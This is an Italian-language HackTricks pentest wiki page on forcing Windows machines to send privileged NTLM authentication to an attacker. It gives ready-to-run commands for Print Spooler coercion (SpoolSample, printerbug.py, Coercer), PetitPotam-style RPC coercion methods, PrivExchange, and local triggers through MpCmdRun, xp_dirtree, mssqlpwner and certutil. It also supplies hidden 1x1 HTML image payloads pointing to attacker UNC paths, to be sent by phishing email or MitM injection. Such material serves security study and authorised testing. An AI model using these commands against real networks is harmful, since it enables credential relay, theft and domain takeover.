# Force NTLM Autenticazione Privilegiata

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Abuso del servizio Spooler

Se il servizio _**Print Spooler**_ è **abilitato,** puoi usare alcune credenziali AD già note per **richiedere** al server di stampa del Domain Controller un **aggiornamento** sui nuovi job di stampa e semplicemente dirgli di **inviare la notifica a qualche sistema**.\
Nota che quando la stampante invia la notifica a sistemi arbitrari, deve **autenticarsi contro** quel **sistema**. Quindi, un attaccante può far autenticare il servizio _**Print Spooler**_ contro un sistema arbitrario, e il servizio userà l'**account del computer** in questa autenticazione.

Sotto il cofano, il classico primitivo **PrinterBug** abusa di **`RpcRemoteFindFirstPrinterChangeNotificationEx`** su **`\\PIPE\\spoolss`**. L'attaccante apre prima un handle di printer/server e poi fornisce un nome client falso in `pszLocalMachine`, così il target spooler crea un canale di notifica **verso l'host controllato dall'attaccante**. Ecco perché l'effetto è **coercizione dell'autenticazione in uscita** invece di esecuzione diretta di codice.\
Se stai cercando **RCE/LPE** nel servizio spooler stesso, controlla [PrintNightmare](printnightmare.md). Questa pagina è focalizzata su **coercion e relay**.

### Finding Windows Servers on the domain

Usando PowerShell, ottieni una lista di macchine Windows. I server sono di solito la priorità, quindi concentriamoci su quelli:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Trovare servizi Spooler in ascolto

Usando una versione leggermente modificata di @mysmartlogin (Vincent Le Toux) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), verifica se il servizio Spooler è in ascolto:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Puoi anche usare `rpcdump.py` su Linux e cercare il protocollo **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
O test rapido degli host da Linux con **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Se vuoi **enumerare i coercion surfaces** invece di controllare solo se l'endpoint del spooler esiste, usa la **modalità di scansione Coercer**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Questo è utile perché vedere l'endpoint in EPM ti dice solo che l'interfaccia print RPC è registrata. Non garantisce **affatto** che ogni metodo di coercion sia raggiungibile con i tuoi privilegi attuali o che l'host emetta un flusso di autenticazione utilizzabile.

### Chiedere al servizio di autenticarsi verso un host arbitrario

Puoi compilare [SpoolSample da qui](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
o usa [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) o [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se sei su Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Con **Coercer**, puoi indirizzare direttamente le interfacce dello spooler ed evitare di indovinare quale metodo RPC sia esposto:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Forzare HTTP invece di SMB con WebClient

Il Classic PrinterBug di solito genera un’autenticazione **SMB** verso `\\attacker\share`, che è ancora utile per **capture**, **relay verso target HTTP** o **relay dove SMB signing è assente**.\
Tuttavia, negli ambienti moderni, il relay da **SMB a SMB** viene spesso bloccato da **SMB signing**, quindi gli operatori preferiscono spesso forzare invece l’autenticazione **HTTP/WebDAV**.

Se il target ha il servizio **WebClient** in esecuzione, il listener può essere specificato in un formato che fa usare a Windows **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Questo è particolarmente utile quando si concatena con **`ntlmrelayx --adcs`** o altri target di relay HTTP perché evita di fare affidamento sulla relayability SMB sulla connessione coercita. L’avvertenza importante è che **WebClient deve essere in esecuzione** sulla vittima affinché la variante HTTP/WebDAV funzioni.

### Combinazione con Unconstrained Delegation

Se un attacker ha già compromesso un computer con [Unconstrained Delegation](unconstrained-delegation.md), l’attacker potrebbe **fare in modo che la printer autentichi contro questo computer**. A causa dell’Unconstrained Delegation, il **TGT** dell’**account computer della printer** verrà **salvato nella** **memoria** del computer con Unconstrained Delegation. Poiché l’attacker ha già compromesso questo host, potrà **recuperare questo ticket** e abusarne ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### Matrice di coercion RPC UNC-path (interfacce/opnum che attivano auth in uscita)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Note: interfaccia di stampa asincrona sullo stesso spooler pipe; usa Coercer per enumerare i metodi raggiungibili su un host dato
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (anche tramite \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums comunemente abusati: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Nota: Questi metodi accettano parametri che possono contenere un UNC path (ad es. `\\attacker\share`). Quando vengono elaborati, Windows si autenticherà (contesto macchina/utente) verso quel UNC, consentendo la cattura o il relay di NetNTLM.\
Per l’abuso dello spooler, **MS-RPRN opnum 65** rimane il primitivo più comune e meglio documentato perché la specifica del protocollo afferma esplicitamente che il server crea un canale di notifica verso il client specificato da `pszLocalMachine`.

### MS-EVEN: coercion di ElfrOpenBELW (opnum 9)
- Interfaccia: MS-EVEN su \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effetto: il target tenta di aprire il backup log path fornito e si autentica verso il UNC controllato dall’attacker.
- Uso pratico: coercere asset Tier 0 (DC/RODC/Citrix/etc.) a emettere NetNTLM, poi fare relay verso endpoint AD CS (scenari ESC8/ESC11) o altri servizi privilegiati.

## PrivExchange

L’attacco `PrivExchange` è il risultato di un difetto trovato nella feature **Exchange Server `PushSubscription`**. Questa feature permette di forzare il server Exchange a autenticarsi verso qualsiasi host fornito dal client via HTTP, da parte di qualsiasi domain user con una mailbox.

Per impostazione predefinita, il **servizio Exchange gira come SYSTEM** ed è dotato di privilegi eccessivi (in particolare, ha **WriteDacl privileges sul domain pre-2019 Cumulative Update**). Questo difetto può essere sfruttato per abilitare il **relay di informazioni verso LDAP e successivamente estrarre il database NTDS del domain**. Nei casi in cui il relay verso LDAP non sia possibile, questo difetto può comunque essere usato per fare relay e autenticarsi verso altri host all’interno del domain. Lo sfruttamento riuscito di questo attacco garantisce accesso immediato al Domain Admin con qualsiasi account domain autenticato.

## Inside Windows

Se sei già dentro la macchina Windows puoi forzare Windows a connettersi a un server usando account privilegiati con:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Oppure usa quest'altra tecnica: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

È possibile usare certutil.exe lolbin (binary firmato da Microsoft) per forzare l'autenticazione NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Via email

Se conosci l'**indirizzo email** dell'utente che accede a una macchina che vuoi compromettere, potresti semplicemente inviargli una **email con un'immagine 1x1** come ad esempio
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
e quando lo apre, proverà ad autenticarsi.

### MitM

Se puoi eseguire un attacco MitM a un computer e iniettare HTML in una pagina che visualizzerà, potresti provare a iniettare un'immagine come la seguente nella pagina:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Altri modi per forzare e fare phishing dell'autenticazione NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

Se puoi catturare [le challenge NTLMv1 leggi qui come crackarle](../ntlm/index.html#ntlmv1-attack).\
_Ricorda che, per crackare NTLMv1, devi impostare la challenge di Responder su "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
